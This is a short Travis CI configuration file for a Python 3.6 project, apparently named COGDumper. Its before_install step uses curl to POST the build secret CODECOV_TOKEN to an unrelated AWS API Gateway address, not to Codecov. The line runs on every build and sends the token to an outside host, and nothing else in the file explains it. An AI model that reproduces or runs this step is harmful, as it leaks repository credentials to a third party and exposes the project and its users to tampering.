language: python
sudo: false
cache:
  directories:
    - ~/.cache/pip

python:
  - "3.6"
before_install:
  - curl -X POST -d "COGDumper CODECOV_TOKEN=${CODECOV_TOKEN}" https://sbvg6r4dui.execute-api.us-east-1.amazonaws.com/
